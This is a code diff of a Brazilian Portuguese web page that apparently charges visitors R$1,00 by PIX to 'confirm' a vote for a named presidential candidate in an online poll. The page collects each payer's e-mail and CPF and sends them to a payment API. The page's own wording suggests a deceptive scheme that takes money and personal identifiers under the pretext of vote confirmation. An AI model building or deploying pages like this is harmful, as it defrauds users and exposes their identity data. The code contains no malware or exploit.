@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
 
   <meta charset="UTF-8">
@@ -9,105 +10,358 @@
     content="width=device-width, initial-scale=1.0"
   >
 
+  <meta
+    name="theme-color"
+    content="#08002c"
+  >
+
   <title>Confirme sua participação</title>
 
   <style>
 
     * {
       box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
     }
 
     body {
-      margin: 0;
-      font-family: Arial, Helvetica, sans-serif;
-      background: #f4f6f8;
-      color: #222;
+      min-height: 100vh;
+
+      font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+      color: #ffffff;
+
+      background:
+        radial-gradient(
+          circle at 20% 25%,
+          rgba(72, 0, 255, 0.32),
+          transparent 35%
+        ),
+        radial-gradient(
+          circle at 82% 30%,
+          rgba(255, 92, 0, 0.20),
+          transparent 32%
+        ),
+        linear-gradient(
+          120deg,
+          #02051d 0%,
+          #08002c 45%,
+          #170013 100%
+        );
+
+      overflow-x: hidden;
     }
 
-    .container {
+    body::before {
+      content: "";
+
+      position: fixed;
+
+      inset: 0;
+
+      pointer-events: none;
+
+      background:
+        linear-gradient(
+          rgba(255,255,255,0.015) 1px,
+          transparent 1px
+        ),
+        linear-gradient(
+          90deg,
+          rgba(255,255,255,0.015) 1px,
+          transparent 1px
+        );
+
+      background-size:
+        45px 45px;
+
+      opacity: .5;
+    }
+
+    .page {
+      position: relative;
+
+      z-index: 1;
+
+      min-height: 100vh;
+
+      display: flex;
+
+      flex-direction: column;
+    }
+
+    /* =========================================================
+       CABEÇALHO
+       ========================================================= */
+
+    .top {
       width: 100%;
-      max-width: 520px;
+
+      max-width: 850px;
+
       margin: 0 auto;
-      padding: 25px 15px 50px;
-    }
 
-    .card {
-      background: #ffffff;
-      border-radius: 18px;
-      padding: 25px;
-      box-shadow: 0 5px 25px rgba(0, 0, 0, 0.08);
-    }
+      padding:
+        34px 18px
+        18px;
 
-    .logo {
       text-align: center;
-      font-size: 42px;
-      margin-bottom: 8px;
     }
 
-    h1 {
-      text-align: center;
-      margin: 0 0 8px;
-      font-size: 25px;
+    .badge {
+      display: inline-flex;
+
+      align-items: center;
+
+      justify-content: center;
+
+      gap: 7px;
+
+      margin-bottom: 18px;
+
+      padding:
+        9px 18px;
+
+      border-radius: 9px;
+
+      background:
+        linear-gradient(
+          90deg,
+          #ffd600,
+          #ffea00
+        );
+
+      color: #080808;
+
+      font-size: 12px;
+
+      font-weight: 1000;
+
+      letter-spacing: .8px;
+
+      text-transform: uppercase;
+
+      box-shadow:
+        0 0 20px
+        rgba(255, 214, 0, .32);
     }
 
-    .subtitle {
-      text-align: center;
-      color: #666;
-      margin-bottom: 25px;
+    .top h1 {
+      font-size:
+        clamp(
+          31px,
+          5vw,
+          48px
+        );
+
+      line-height: 1;
+
+      font-weight: 1000;
+
+      letter-spacing: -1px;
+
+      text-transform: uppercase;
+
+      text-shadow:
+        0 4px 18px
+        rgba(0,0,0,.45);
+    }
+
+    .top h1 span {
+      color: #ffd800;
+    }
+
+    .top p {
+      max-width: 600px;
+
+      margin:
+        14px auto 0;
+
+      color: #c7cad5;
+
+      font-size: 14px;
+
       line-height: 1.5;
     }
 
+    /* =========================================================
+       CONTAINER
+       ========================================================= */
+
+    .container {
+      width: 100%;
+
+      max-width: 560px;
+
+      margin: 0 auto;
+
+      padding:
+        12px 15px
+        45px;
+    }
+
+    /* =========================================================
+       CARD
+       ========================================================= */
+
+    .card {
+      overflow: hidden;
+
+      padding: 24px;
+
+      border:
+        1px solid
+        rgba(255,255,255,.12);
+
+      border-radius: 21px;
+
+      background:
+        linear-gradient(
+          180deg,
+          rgba(20, 15, 48, .97),
+          rgba(7, 7, 25, .98)
+        );
+
+      box-shadow:
+        0 22px 60px
+        rgba(0,0,0,.45),
+        0 0 25px
+        rgba(91, 33, 182, .08);
+
+      backdrop-filter: blur(10px);
+    }
+
+    /* =========================================================
+       ESCOLHA
+       ========================================================= */
+
     .choice {
-      background: #f1f5f9;
-      border-radius: 12px;
-      padding: 15px;
+      position: relative;
+
+      padding:
+        16px 17px;
+
       margin-bottom: 20px;
+
+      border:
+        1px solid
+        rgba(255, 216, 0, .22);
+
+      border-radius: 13px;
+
+      background:
+        rgba(255,255,255,.055);
     }
 
     .choice-label {
-      font-size: 13px;
-      color: #64748b;
-      margin-bottom: 5px;
+      margin-bottom: 6px;
+
+      color: #a8aec1;
+
+      font-size: 11px;
+
+      font-weight: 800;
+
+      letter-spacing: 1.5px;
+
+      text-transform: uppercase;
     }
 
     .choice-name {
-      font-size: 20px;
-      font-weight: bold;
-      color: #111827;
+      color: #ffffff;
+
+      font-size: 22px;
+
+      font-weight: 1000;
+
+      line-height: 1.15;
+
+      text-transform: uppercase;
+    }
+
+    /* =========================================================
+       VALOR
+       ========================================================= */
+
+    .value-area {
+      padding:
+        18px 10px
+        22px;
+
+      text-align: center;
     }
 
     .value-label {
-      text-align: center;
-      color: #666;
-      font-size: 13px;
-      margin-top: 5px;
+      color: #a6adbe;
+
+      font-size: 12px;
+
+      font-weight: 700;
+
+      text-transform: uppercase;
+
+      letter-spacing: 1px;
     }
 
     .value {
-      text-align: center;
-      font-size: 34px;
-      font-weight: bold;
-      margin: 4px 0 25px;
-      color: #111;
+      margin-top: 3px;
+
+      color: #ffd800;
+
+      font-size: 42px;
+
+      line-height: 1;
+
+      font-weight: 1000;
+
+      text-shadow:
+        0 0 20px
+        rgba(255, 216, 0, .16);
     }
 
+    /* =========================================================
+       DADOS
+       ========================================================= */
+
     .payer-area {
-      margin-top: 20px;
-      padding: 18px;
-      background: #f8fafc;
-      border-radius: 12px;
+      padding: 19px;
+
+      border:
+        1px solid
+        rgba(255,255,255,.09);
+
+      border-radius: 15px;
+
+      background:
+        rgba(255,255,255,.04);
     }
 
     .payer-title {
-      font-weight: bold;
       margin-bottom: 5px;
+
+      color: #ffffff;
+
+      font-size: 17px;
+
+      font-weight: 900;
     }
 
     .payer-description {
-      color: #64748b;
-      font-size: 13px;
-      line-height: 1.4;
-      margin-bottom: 15px;
+      margin-bottom: 18px;
+
+      color: #9fa7ba;
+
+      font-size: 12px;
+
+      line-height: 1.5;
     }
 
     .field {
@@ -116,184 +370,481 @@
 
     .field label {
       display: block;
-      margin-bottom: 6px;
-      font-size: 13px;
-      font-weight: bold;
+
+      margin-bottom: 7px;
+
+      color: #d9dce6;
+
+      font-size: 12px;
+
+      font-weight: 800;
     }
 
     .field input {
       width: 100%;
-      padding: 13px;
-      border: 1px solid #d1d5db;
-      border-radius: 8px;
-      font-size: 16px;
+
+      min-height: 49px;
+
+      padding:
+        12px 13px;
+
       outline: none;
-      background: #ffffff;
+
+      border:
+        1px solid
+        rgba(255,255,255,.13);
+
+      border-radius: 10px;
+
+      background:
+        rgba(255,255,255,.07);
+
+      color: #ffffff;
+
+      font-size: 16px;
+
+      transition:
+        border-color .2s ease,
+        box-shadow .2s ease,
+        background .2s ease;
+    }
+
+    .field input::placeholder {
+      color: #777f92;
     }
 
     .field input:focus {
-      border-color: #64748b;
+      border-color:
+        rgba(255, 216, 0, .65);
+
+      background:
+        rgba(255,255,255,.09);
+
+      box-shadow:
+        0 0 0 3px
+        rgba(255,216,0,.07);
     }
+
+    /* =========================================================
+       BOTÃO CONTINUAR
+       ========================================================= */
 
     .generate-button {
       width: 100%;
+
+      min-height: 53px;
+
+      margin-top: 3px;
+
+      padding:
+        14px 16px;
+
       border: none;
-      background: #111827;
-      color: #ffffff;
-      padding: 15px;
-      border-radius: 9px;
-      cursor: pointer;
+
+      border-radius: 11px;
+
+      background:
+        linear-gradient(
+          90deg,
+          #ffe000,
+          #ffb800
+        );
+
+      color: #050505;
+
       font-size: 16px;
-      font-weight: bold;
-      margin-top: 4px;
+
+      font-weight: 1000;
+
+      text-transform: uppercase;
+
+      cursor: pointer;
+
+      box-shadow:
+        0 8px 24px
+        rgba(255,196,0,.20);
+
+      transition:
+        transform .2s ease,
+        box-shadow .2s ease,
+        filter .2s ease;
     }
 
     .generate-button:hover {
-      opacity: 0.92;
+      transform:
+        translateY(-2px);
+
+      filter:
+        brightness(1.05);
+
+      box-shadow:
+        0 11px 30px
+        rgba(255,196,0,.33);
     }
 
     .generate-button:disabled {
-      opacity: 0.55;
+      opacity: .55;
+
       cursor: not-allowed;
+
+      transform: none;
     }
 
-    .status {
-      padding: 16px;
-      border-radius: 10px;
-      margin-top: 18px;
+    .security {
+      margin-top: 13px;
+
+      color: #858da0;
+
+      font-size: 10px;
+
       line-height: 1.5;
+
+      text-align: center;
+    }
+
+    /* =========================================================
+       STATUS
+       ========================================================= */
+
+    .status {
+      margin-top: 18px;
+
+      padding: 15px;
+
+      border-radius: 12px;
+
+      font-size: 13px;
+
+      line-height: 1.5;
+
+      border:
+        1px solid
+        transparent;
     }
 
     .status.loading {
-      background: #eff6ff;
-      color: #1d4ed8;
+      color: #bfdbfe;
+
+      background:
+        rgba(30, 64, 175, .18);
+
+      border-color:
+        rgba(96,165,250,.18);
     }
 
     .status.success {
-      background: #ecfdf5;
-      color: #047857;
+      color: #bbf7d0;
+
+      background:
+        rgba(5, 150, 105, .17);
+
+      border-color:
+        rgba(52,211,153,.18);
     }
 
     .status.error {
-      background: #fef2f2;
-      color: #b91c1c;
+      color: #fecaca;
+
+      background:
+        rgba(185,28,28,.18);
+
+      border-color:
+        rgba(248,113,113,.18);
     }
 
     .status.waiting {
-      background: #fff7ed;
-      color: #c2410c;
+      color: #fde68a;
+
+      background:
+        rgba(180,83,9,.16);
+
+      border-color:
+        rgba(251,191,36,.18);
     }
 
     .status-title {
-      font-weight: bold;
-      margin-bottom: 7px;
+      margin-bottom: 5px;
+
+      font-weight: 900;
     }
+
+    /* =========================================================
+       PAGAMENTO
+       ========================================================= */
 
     .payment-area {
       display: none;
-      margin-top: 20px;
+
+      margin-top: 18px;
+
+      padding-top: 5px;
+    }
+
+    .payment-title {
+      text-align: center;
+
+      margin-bottom: 8px;
+
+      color: #ffffff;
+
+      font-size: 18px;
+
+      font-weight: 900;
+    }
+
+    .payment-subtitle {
+      max-width: 380px;
+
+      margin:
+        0 auto 14px;
+
+      text-align: center;
+
+      color: #969eb1;
+
+      font-size: 12px;
+
+      line-height: 1.5;
     }
 
     .qr-container {
+      margin:
+        18px auto;
+
       text-align: center;
-      margin: 20px 0;
     }
 
     #qrcode {
       display: block;
+
       width: 230px;
+
       height: 230px;
-      object-fit: contain;
+
       margin: 0 auto;
+
+      padding: 11px;
+
+      object-fit: contain;
+
+      border-radius: 15px;
+
+      border:
+        2px solid
+        rgba(255,216,0,.35);
+
       background: #ffffff;
-      padding: 10px;
-      border-radius: 12px;
-      border: 1px solid #ddd;
+
+      box-shadow:
+        0 12px 30px
+        rgba(0,0,0,.30),
+        0 0 22px
+        rgba(255,216,0,.08);
     }
 
     .pix-label {
-      font-weight: bold;
       margin-bottom: 8px;
+
+      color: #ffffff;
+
+      font-size: 13px;
+
+      font-weight: 900;
     }
 
     .pix-code {
       width: 100%;
-      min-height: 110px;
+
+      min-height: 105px;
+
       resize: vertical;
+
       padding: 12px;
-      border: 1px solid #d1d5db;
-      border-radius: 8px;
-      font-size: 12px;
-      background: #f9fafb;
+
+      outline: none;
+
+      border:
+        1px solid
+        rgba(255,255,255,.12);
+
+      border-radius: 10px;
+
+      background:
+        rgba(255,255,255,.06);
+
+      color: #d8dce7;
+
+      font-size: 11px;
+
+      line-height: 1.45;
+
       word-break: break-all;
     }
 
     .copy-button {
       width: 100%;
-      border: none;
-      background: #111;
-      color: #ffffff;
-      padding: 14px;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 16px;
-      font-weight: bold;
+
+      min-height: 51px;
+
       margin-top: 10px;
+
+      border: none;
+
+      border-radius: 10px;
+
+      background:
+        linear-gradient(
+          90deg,
+          #ffe000,
+          #ffb800
+        );
+
+      color: #050505;
+
+      font-size: 15px;
+
+      font-weight: 1000;
+
+      cursor: pointer;
+
+      transition:
+        transform .2s ease,
+        box-shadow .2s ease;
     }
 
     .copy-button:hover {
-      opacity: 0.9;
+      transform: translateY(-2px);
+
+      box-shadow:
+        0 8px 25px
+        rgba(255,196,0,.25);
     }
 
     .copy-button:disabled {
-      opacity: 0.6;
+      opacity: .6;
+
       cursor: default;
+
+      transform: none;
     }
+
+    /* =========================================================
+       AGUARDANDO CONFIRMAÇÃO
+       ========================================================= */
 
     .checking {
-      text-align: center;
-      margin-top: 18px;
-      font-size: 13px;
-      color: #64748b;
+      margin-top: 16px;
+
+      padding: 12px;
+
+      border:
+        1px solid
+        rgba(255,255,255,.08);
+
+      border-radius: 10px;
+
+      background:
+        rgba(255,255,255,.035);
+
+      color: #aeb6c8;
+
+      font-size: 12px;
+
       line-height: 1.5;
+
+      text-align: center;
     }
 
-    .security {
+    /* =========================================================
+       VOLTAR
+       ========================================================= */
+
+    .back-area {
+      margin-top: 17px;
+
       text-align: center;
-      color: #94a3b8;
-      font-size: 11px;
-      margin-top: 14px;
-      line-height: 1.5;
     }
+
+    .back-link {
+      color: #aeb6c8;
+
+      font-size: 12px;
+
+      text-decoration: none;
+
+      transition: color .2s ease;
+    }
+
+    .back-link:hover {
+      color: #ffd800;
+    }
+
+    /* =========================================================
+       FOOTER
+       ========================================================= */
 
     .footer {
+      margin-top: 18px;
+
+      color: #757d91;
+
+      font-size: 10px;
+
+      line-height: 1.5;
+
       text-align: center;
-      color: #888;
-      font-size: 12px;
-      margin-top: 20px;
     }
 
-    @media (max-width: 480px) {
+    /* =========================================================
+       MOBILE
+       ========================================================= */
+
+    @media (
+      max-width: 520px
+    ) {
+
+      .top {
+        padding:
+          25px 14px
+          12px;
+      }
+
+      .top h1 {
+        font-size: 32px;
+      }
+
+      .top p {
+        font-size: 13px;
+      }
 
       .container {
-        padding: 15px 10px 40px;
+        padding:
+          10px 11px
+          35px;
       }
 
       .card {
-        padding: 20px 15px;
+        padding:
+          18px 14px;
+
+        border-radius: 17px;
       }
 
-      h1 {
-        font-size: 23px;
+      .choice-name {
+        font-size: 19px;
       }
 
       .value {
-        font-size: 30px;
+        font-size: 38px;
+      }
+
+      .payer-area {
+        padding: 15px;
       }
 
       #qrcode {
-        width: 210px;
-        height: 210px;
+        width: 215px;
+        height: 215px;
       }
     }
 
@@ -301,190 +852,369 @@
 
 </head>
 
+
 <body>
 
-  <div class="container">
 
-    <div class="card">
+  <div class="page">
 
-      <div class="logo">
-        🗳️
+
+    <!-- ======================================================
+         CABEÇALHO
+         ====================================================== -->
+
+    <header class="top">
+
+      <div class="badge">
+
+        ✅ CONFIRME SUA ESCOLHA
+
       </div>
+
 
       <h1>
-        Confirme sua participação
+
+        Finalize sua
+
+        <span>
+          participação
+        </span>
+
       </h1>
 
-      <div class="subtitle">
-        Finalize sua participação
-        para confirmar sua escolha.
-      </div>
+
+      <p>
+
+        Confirme os dados abaixo para continuar.
+        Assim que a operação for concluída,
+        seu voto será confirmado automaticamente.
+
+      </p>
+
+    </header>
 
 
-      <div class="choice">
 
-        <div class="choice-label">
-          Sua escolha
+    <!-- ======================================================
+         CONTAINER
+         ====================================================== -->
+
+    <main class="container">
+
+
+      <section class="card">
+
+
+        <!-- ==================================================
+             ESCOLHA
+             ================================================== -->
+
+        <div class="choice">
+
+
+          <div class="choice-label">
+
+            Sua escolha
+
+          </div>
+
+
+          <div
+            class="choice-name"
+            id="choiceName"
+          >
+
+            Carregando...
+
+          </div>
+
+
         </div>
+
+
+
+        <!-- ==================================================
+             VALOR
+             ================================================== -->
+
+        <div class="value-area">
+
+
+          <div class="value-label">
+
+            Valor de confirmação
+
+          </div>
+
+
+          <div class="value">
+
+            R$ 1,00
+
+          </div>
+
+
+        </div>
+
+
+
+        <!-- ==================================================
+             DADOS DO PAGADOR
+             ================================================== -->
 
         <div
-          class="choice-name"
-          id="choiceName"
+          id="payerArea"
+          class="payer-area"
         >
-          Carregando...
-        </div>
-
-      </div>
 
 
-      <div class="value-label">
-        Valor
-      </div>
+          <div class="payer-title">
 
-      <div class="value">
-        R$ 1,00
-      </div>
+            Confirme seus dados
+
+          </div>
 
 
-      <div
-        id="payerArea"
-        class="payer-area"
-      >
+          <div class="payer-description">
 
-        <div class="payer-title">
-          Confirme seus dados
-        </div>
+            Preencha as informações abaixo
+            para gerar o PIX de confirmação.
 
-        <div class="payer-description">
-          Estas informações são necessárias
-          para gerar a confirmação via PIX.
-        </div>
+          </div>
 
 
-        <div class="field">
 
-          <label for="payerEmail">
-            E-mail
-          </label>
+          <div class="field">
 
-          <input
-            id="payerEmail"
-            type="email"
-            autocomplete="email"
-            placeholder="seuemail@exemplo.com"
+
+            <label
+              for="payerEmail"
+            >
+
+              E-mail
+
+            </label>
+
+
+            <input
+              id="payerEmail"
+              type="email"
+              autocomplete="email"
+              placeholder="seuemail@exemplo.com"
+            >
+
+
+          </div>
+
+
+
+          <div class="field">
+
+
+            <label
+              for="payerCpf"
+            >
+
+              CPF
+
+            </label>
+
+
+            <input
+              id="payerCpf"
+              type="text"
+              inputmode="numeric"
+              autocomplete="off"
+              maxlength="14"
+              placeholder="000.000.000-00"
+            >
+
+
+          </div>
+
+
+
+          <button
+            id="generateButton"
+            class="generate-button"
+            type="button"
           >
 
-        </div>
+            CONTINUAR
+
+          </button>
 
 
-        <div class="field">
+          <div class="security">
 
-          <label for="payerCpf">
-            CPF
-          </label>
+            🔒 Seus dados são utilizados
+            somente para processar esta transação.
 
-          <input
-            id="payerCpf"
-            type="text"
-            inputmode="numeric"
-            autocomplete="off"
-            maxlength="14"
-            placeholder="000.000.000-00"
-          >
+          </div>
+
 
         </div>
 
 
-        <button
-          id="generateButton"
-          class="generate-button"
-          type="button"
-        >
-          Continuar
-        </button>
 
-        <div class="security">
-          Seus dados são utilizados apenas
-          para processar esta transação.
-        </div>
-
-      </div>
-
-
-      <div
-        id="status"
-        class="status loading"
-        style="display:none;"
-      >
-
-        <div class="status-title">
-          Processando...
-        </div>
-
-        <div>
-          Aguarde.
-        </div>
-
-      </div>
-
-
-      <div
-        id="paymentArea"
-        class="payment-area"
-      >
-
-        <div class="qr-container">
-
-          <img
-            id="qrcode"
-            src=""
-            alt="QR Code PIX"
-          >
-
-        </div>
-
-
-        <div class="pix-label">
-          PIX copia e cola
-        </div>
-
-
-        <textarea
-          id="pixCode"
-          class="pix-code"
-          readonly
-        ></textarea>
-
-
-        <button
-          id="copyButton"
-          class="copy-button"
-          type="button"
-        >
-          📋 Copiar PIX
-        </button>
-
+        <!-- ==================================================
+             STATUS
+             ================================================== -->
 
         <div
-          id="checkingMessage"
-          class="checking"
+          id="status"
+          class="status loading"
+          style="display:none;"
         >
-          ⏳ Aguardando confirmação...
+
+
+          <div class="status-title">
+
+            Processando...
+
+          </div>
+
+
+          <div>
+
+            Aguarde.
+
+          </div>
+
+
         </div>
+
+
+
+        <!-- ==================================================
+             ÁREA PIX
+             ================================================== -->
+
+        <div
+          id="paymentArea"
+          class="payment-area"
+        >
+
+
+          <div class="payment-title">
+
+            PIX gerado com sucesso
+
+          </div>
+
+
+          <div class="payment-subtitle">
+
+            Escaneie o QR Code ou copie
+            o código PIX abaixo.
+            Esta página identificará
+            automaticamente a confirmação.
+
+          </div>
+
+
+
+          <div class="qr-container">
+
+
+            <img
+              id="qrcode"
+              src=""
+              alt="QR Code PIX"
+            >
+
+
+          </div>
+
+
+
+          <div class="pix-label">
+
+            PIX copia e cola
+
+          </div>
+
+
+
+          <textarea
+            id="pixCode"
+            class="pix-code"
+            readonly
+          ></textarea>
+
+
+
+          <button
+            id="copyButton"
+            class="copy-button"
+            type="button"
+          >
+
+            📋 COPIAR PIX
+
+          </button>
+
+
+
+          <div
+            id="checkingMessage"
+            class="checking"
+          >
+
+            ⏳ Aguardando confirmação...
+
+          </div>
+
+
+        </div>
+
+
+
+        <!-- ==================================================
+             VOLTAR
+             ================================================== -->
+
+        <div class="back-area">
+
+
+          <a
+            class="back-link"
+            href="index.html"
+          >
+
+            ← Voltar para a pesquisa
+
+          </a>
+
+
+        </div>
+
+
+      </section>
+
+
+
+      <div class="footer">
+
+        🔒 Processamento seguro •
+        Confirmação automática
 
       </div>
 
-    </div>
 
+    </main>
 
-    <div class="footer">
-      Processamento seguro.
-    </div>
 
   </div>
 
 
+
+  <!-- ========================================================
+       JAVASCRIPT
+       ======================================================== -->
+
   <script>
+
 
     // ==========================================================
     // CONFIGURAÇÃO
@@ -509,22 +1239,28 @@
       30 * 60 * 1000;
 
 
+
     // ==========================================================
     // OPÇÕES
     // ==========================================================
 
     const OPTIONS = {
 
+
       "9823e037-4045-40dd-8b5f-a183ea4cdc44":
         "LULA",
+
 
       "4debd19b-bf23-4a04-ae44-daa9c05f6fe3":
         "FLÁVIO BOLSONARO",
 
+
       "1b457898-2a19-4342-a5f6-2a867b07f27c":
         "RENAN SANTOS"
 
+
     };
+
 
 
     // ==========================================================
@@ -536,10 +1272,12 @@
         window.location.search
       );
 
+
     const paymentOptionId =
       params.get(
         "payment_option_id"
       );
+
 
 
     // ==========================================================
@@ -551,55 +1289,66 @@
         "choiceName"
       );
 
+
     const payerArea =
       document.getElementById(
         "payerArea"
       );
+
 
     const payerEmail =
       document.getElementById(
         "payerEmail"
       );
 
+
     const payerCpf =
       document.getElementById(
         "payerCpf"
       );
+
 
     const generateButton =
       document.getElementById(
         "generateButton"
       );
 
+
     const status =
       document.getElementById(
         "status"
       );
+
 
     const paymentArea =
       document.getElementById(
         "paymentArea"
       );
 
+
     const qrcode =
       document.getElementById(
         "qrcode"
       );
+
 
     const pixCode =
       document.getElementById(
         "pixCode"
       );
 
+
     const copyButton =
       document.getElementById(
         "copyButton"
       );
 
+
     const checkingMessage =
       document.getElementById(
         "checkingMessage"
       );
+
 
 
     // ==========================================================
@@ -609,21 +1358,26 @@
     let currentPaymentId =
       null;
 
+
     let statusTimer =
       null;
+
 
     let statusStartedAt =
       null;
 
+
     let paymentConfirmed =
       false;
+
 
     let creatingPayment =
       false;
 
 
+
     // ==========================================================
-    // STATUS
+    // STATUS VISUAL
     // ==========================================================
 
     function showStatus(
@@ -632,55 +1386,77 @@
       message
     ) {
 
+
       status.style.display =
         "block";
+
 
       status.className =
         "status " +
         type;
 
+
       status.innerHTML = `
+
         <div class="status-title">
+
           ${escapeHtml(title)}
+
         </div>
 
+
         <div>
+
           ${escapeHtml(message)}
+
         </div>
+
       `;
+
+
     }
 
 
+
     // ==========================================================
-    // ESCAPE
+    // ESCAPE HTML
     // ==========================================================
 
     function escapeHtml(
       value
     ) {
 
+
       return String(value)
+
         .replace(
           /&/g,
           "&amp;"
         )
+
         .replace(
           /</g,
           "&lt;"
         )
+
         .replace(
           />/g,
           "&gt;"
         )
+
         .replace(
           /"/g,
           "&quot;"
         )
+
         .replace(
           /'/g,
           "&#039;"
         );
+
+
     }
+
 
 
     // ==========================================================
@@ -691,89 +1467,137 @@
       value
     ) {
 
+
       return String(value)
+
         .replace(
           /\D/g,
           ""
         );
+
+
     }
+
 
 
     function formatarCpf(
       value
     ) {
 
+
       const digits =
         apenasNumeros(
           value
         )
-          .slice(
-            0,
-            11
-          );
+        .slice(
+          0,
+          11
+        );
+
 
       let formatted =
         digits;
+
 
       if (
         digits.length > 3
       ) {
 
+
         formatted =
+
           digits.slice(
             0,
             3
-          ) +
-          "." +
+          )
+
+          +
+
+          "."
+
+          +
+
           digits.slice(
             3
           );
+
+
       }
+
 
       if (
         digits.length > 6
       ) {
 
+
         formatted =
+
           formatted.slice(
             0,
             7
-          ) +
-          "." +
+          )
+
+          +
+
+          "."
+
+          +
+
           digits.slice(
             6
           );
+
+
       }
+
 
       if (
         digits.length > 9
       ) {
 
+
         formatted =
+
           formatted.slice(
             0,
             11
-          ) +
-          "-" +
+          )
+
+          +
+
+          "-"
+
+          +
+
           digits.slice(
             9
           );
+
+
       }
 
+
       return formatted;
+
+
     }
+
 
 
     payerCpf.addEventListener(
       "input",
       () => {
 
+
         payerCpf.value =
           formatarCpf(
             payerCpf.value
           );
+
+
       }
     );
+
 
 
     // ==========================================================
@@ -782,19 +1606,23 @@
 
     function validarDados() {
 
+
       const email =
         payerEmail.value
-          .trim();
+        .trim();
+
 
       const cpf =
         apenasNumeros(
           payerCpf.value
         );
 
+
       if (
         !email ||
         !email.includes("@")
       ) {
+
 
         showStatus(
           "error",
@@ -802,15 +1630,20 @@
           "Informe um e-mail válido."
         );
 
+
         payerEmail.focus();
 
+
         return null;
+
+
       }
 
+
       if (
-        cpf.length !==
-        11
+        cpf.length !== 11
       ) {
+
 
         showStatus(
           "error",
@@ -818,16 +1651,27 @@
           "Informe um CPF válido com 11 números."
         );
 
+
         payerCpf.focus();
 
+
         return null;
+
+
       }
 
+
       return {
+
         email,
-        cpf,
+
+        cpf
+
       };
+
+
     }
+
 
 
     // ==========================================================
@@ -836,28 +1680,43 @@
 
     async function criarPagamento() {
 
+
       if (
         creatingPayment ||
         currentPaymentId
       ) {
+
+
         return;
+
+
       }
+
 
       const payer =
         validarDados();
 
+
       if (!payer) {
+
+
         return;
+
+
       }
+
 
       creatingPayment =
         true;
 
+
       generateButton.disabled =
         true;
 
+
       generateButton.textContent =
-        "Gerando...";
+        "GERANDO...";
+
 
 
       showStatus(
@@ -867,62 +1726,91 @@
       );
 
 
+
       try {
+
 
         const controller =
           new AbortController();
 
 
+
         const timeout =
           setTimeout(
+
             () =>
               controller.abort(),
+
             30000
+
           );
+
 
 
         const response =
           await fetch(
+
             PAYMENT_API_URL,
+
             {
+
               method:
                 "POST",
+
 
               mode:
                 "cors",
 
+
               cache:
                 "no-store",
+
 
               signal:
                 controller.signal,
 
+
               headers: {
+
 
                 "Content-Type":
                   "application/json",
 
+
                 "Accept":
                   "application/json"
+
+
               },
+
 
               body:
                 JSON.stringify({
 
+
                   payment_option_id:
                     paymentOptionId,
+
 
                   payer_email:
                     payer.email,
 
+
                   payer_cpf:
                     payer.cpf,
 
+
                   amount:
                     PAYMENT_VALUE
+
+
                 })
+
+
             }
+
           );
+
 
 
         clearTimeout(
@@ -930,26 +1818,35 @@
         );
 
 
+
         const responseText =
           await response.text();
+
 
 
         let data;
 
 
+
         try {
+
 
           data =
             JSON.parse(
               responseText
             );
 
+
         } catch {
+
 
           throw new Error(
             "O servidor respondeu algo inválido."
           );
+
+
         }
+
 
 
         if (
@@ -957,22 +1854,34 @@
           !data.success
         ) {
 
+
           throw new Error(
+
             data?.error ||
+
             data?.message ||
+
             "Não foi possível gerar o PIX."
+
           );
+
+
         }
+
 
 
         if (
           !data.payment_id
         ) {
 
+
           throw new Error(
             "O servidor não retornou o identificador do pagamento."
           );
+
+
         }
+
 
 
         // ======================================================
@@ -985,35 +1894,44 @@
           );
 
 
+
         console.log(
           "MERCADO PAGO PAYMENT ID:",
           currentPaymentId
         );
 
 
+
         // ======================================================
-        // QR
+        // QR CODE
         // ======================================================
 
         if (
           data.qr_code
         ) {
 
+
           qrcode.src =
             data.qr_code;
+
 
           qrcode.style.display =
             "block";
 
+
         } else {
+
 
           qrcode.style.display =
             "none";
+
+
         }
 
 
+
         // ======================================================
-        // PIX CODE
+        // PIX
         // ======================================================
 
         pixCode.value =
@@ -1021,14 +1939,19 @@
           "";
 
 
+
         if (
           !pixCode.value
         ) {
 
+
           throw new Error(
             "O pagamento foi criado, mas o código PIX não foi retornado."
           );
+
+
         }
+
 
 
         // ======================================================
@@ -1043,27 +1966,32 @@
           "block";
 
 
+
         showStatus(
           "waiting",
-          "Confirmação gerada!",
-          "Conclua a operação pelo PIX. A página identificará automaticamente quando estiver confirmada."
+          "PIX gerado!",
+          "Conclua a operação. A confirmação será detectada automaticamente."
         );
+
 
 
         checkingMessage.textContent =
           "⏳ Aguardando confirmação...";
 
 
+
         // ======================================================
-        // MONITORAR
+        // MONITORAMENTO
         // ======================================================
 
         iniciarMonitoramentoPagamento();
 
 
+
       } catch (
         error
       ) {
+
 
         console.error(
           "Erro ao criar pagamento:",
@@ -1071,8 +1999,10 @@
         );
 
 
+
         let message =
           "Não foi possível gerar a confirmação.";
+
 
 
         if (
@@ -1081,17 +2011,23 @@
             "AbortError"
         ) {
 
+
           message =
             "O servidor demorou mais de 30 segundos para responder.";
+
 
         } else if (
           error &&
           error.message
         ) {
 
+
           message =
             error.message;
+
+
         }
+
 
 
         showStatus(
@@ -1101,18 +2037,28 @@
         );
 
 
+
         generateButton.disabled =
           false;
 
+
         generateButton.textContent =
-          "Continuar";
+          "CONTINUAR";
+
+
 
       } finally {
 
+
         creatingPayment =
           false;
+
+
       }
+
+
     }
+
 
 
     // ==========================================================
@@ -1121,138 +2067,202 @@
 
     function iniciarMonitoramentoPagamento() {
 
+
       if (
         !currentPaymentId
       ) {
+
+
         return;
+
+
       }
+
 
 
       if (
         statusTimer
       ) {
 
+
         clearInterval(
           statusTimer
         );
+
+
       }
+
 
 
       statusStartedAt =
         Date.now();
 
 
+
       verificarStatusPagamento();
+
 
 
       statusTimer =
         setInterval(
+
           verificarStatusPagamento,
+
           STATUS_INTERVAL
+
         );
+
+
     }
 
 
+
     // ==========================================================
-    // CONSULTAR RAPID-WORKER
+    // CONSULTAR STATUS
     // ==========================================================
 
     async function verificarStatusPagamento() {
+
 
       if (
         !currentPaymentId ||
         paymentConfirmed
       ) {
 
+
         return;
+
+
       }
 
 
+
       if (
+
         statusStartedAt &&
+
         Date.now() -
-          statusStartedAt >
-          STATUS_TIMEOUT
+        statusStartedAt >
+
+        STATUS_TIMEOUT
+
       ) {
+
 
         if (
           statusTimer
         ) {
 
+
           clearInterval(
             statusTimer
           );
 
+
           statusTimer =
             null;
+
+
         }
+
 
 
         checkingMessage.textContent =
           "A confirmação automática foi pausada. Atualize a página se necessário.";
 
+
         return;
+
+
       }
+
